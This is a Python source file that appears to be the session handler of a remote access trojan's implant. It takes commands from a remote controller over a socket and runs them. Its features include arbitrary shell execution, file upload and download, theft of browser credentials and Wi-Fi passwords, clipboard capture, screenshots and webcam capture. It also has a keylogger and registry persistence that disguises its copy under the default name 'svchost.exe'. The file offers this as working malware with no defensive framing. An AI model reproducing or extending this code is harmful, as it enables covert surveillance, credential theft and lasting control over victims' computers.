import threading
import subprocess

from agent.core.protocol import reliable_send, reliable_recv
from agent.modules.file_ops import (
    upload_file, download_file, list_dir, change_dir, current_dir,
    delete, move, read_file, touch,
)
from agent.modules.shell import run_command
from agent.modules.sysinfo import get_sysinfo
from agent.modules.persistence import install_persistence
from agent.modules.process_ops import kill_process, sendall_command


def handle_session(sock, platform):
    import agent.core.protocol as protocol
    protocol.recv_buffer = b''

    keylog = None
    keylog_thread = None
    proc = None

    while True:
        command = reliable_recv(sock)
        try:
            command = command.strip()
        except Exception:
            pass

        if command == 'terminate':
            if proc and proc.poll() is None:
                try:
                    subprocess.call(
                        platform.kill_process_cmd(proc.pid).split(),
                        shell=True
                    )
                    proc = None
                except Exception:
                    pass
            continue

        if command == 'quit':
            break
        elif command == 'background':
            reliable_send(sock, '[+] Session backgrounded')
        elif command == 'help':
            reliable_send(sock, '[+] Help displayed on server')
        elif command == 'clear':
            reliable_send(sock, '[+] Screen cleared on server')

        elif command.startswith('ls'):
            path = command[3:] if len(command) > 3 else None
            list_dir(sock, platform, path)
        elif command.startswith('cd '):
            change_dir(sock, command[3:])
        elif command == 'pwd':
            current_dir(sock)
        elif command.startswith('rm '):
            delete(sock, command[3:])
        elif command.startswith('mv '):
            move(sock, command[3:])
        elif command.startswith('cat '):
            read_file(sock, platform, command[4:])
        elif command.startswith('touch '):
            touch(sock, platform, command[6:])
        elif command == 'ps' or command == 'ifconfig' or command == 'ip addr':
            shell_cmd = platform.process_list_cmd() if command == 'ps' else platform.network_info_cmd()
            run_command(sock, shell_cmd)
        elif command.startswith('kill '):
            kill_process(sock, platform, command[5:])
        elif command.startswith('grep '):
            shell_cmd = platform.grep_cmd(command[5:])
            run_command(sock, shell_cmd)

        elif command == 'sysinfo':
            result = get_sysinfo(platform, sock)
            reliable_send(sock, result)
        elif command == 'check_admin':
            reliable_send(sock, platform.check_admin())
        elif command == 'clipboard':
            from agent.modules.surveillance import get_clipboard
            reliable_send(sock, get_clipboard())
        elif command == 'wifi_dump':
            from agent.modules.credentials import wifi_dump
            reliable_send(sock, wifi_dump())
        elif command == 'browser_creds':
            from agent.modules.credentials import browser_credentials
            reliable_send(sock, browser_credentials())

        elif command == 'screenshot':
            from agent.modules.surveillance import screenshot
            screenshot(sock)
        elif command == 'webcam':
            from agent.modules.surveillance import webcam_capture
            webcam_capture(sock)

        elif command.startswith('upload'):
            download_file(sock, command[7:])
            reliable_send(sock, f'[+] File received: {command[7:]}')
        elif command.startswith('download'):
            upload_file(sock, command[9:])

        elif command == 'keylog_start':
            from agent.modules.keylogger import Keylogger
            try:
                keylog = Keylogger()
                keylog_thread = threading.Thread(target=keylog.start)
                keylog_thread.daemon = True
                keylog_thread.start()
                reliable_send(sock, '[+] Keylogger Started!')
            except Exception as e:
                reliable_send(sock, f'[-] Error starting keylogger: {str(e)}')
        elif command == 'keylog_dump':
            if keylog:
                reliable_send(sock, keylog.read_logs())
            else:
                reliable_send(sock, '[-] Keylogger not running')
        elif command == 'keylog_stop':
            if keylog:
                keylog.self_destruct()
                keylog = None
                keylog_thread = None
                reliable_send(sock, '[+] Keylogger Stopped!')
            else:
                reliable_send(sock, '[-] Keylogger not running')

        elif command.startswith('persistence '):
            parts = command[12:].split(' ', 1)
            reg_name = parts[0]
            copy_name = parts[1] if len(parts) > 1 else 'svchost.exe'
            result = install_persistence(platform, reg_name, copy_name)
            reliable_send(sock, result)

        elif command.startswith('sendall '):
            sendall_command(sock, command[8:])

        else:
            run_command(sock, command)
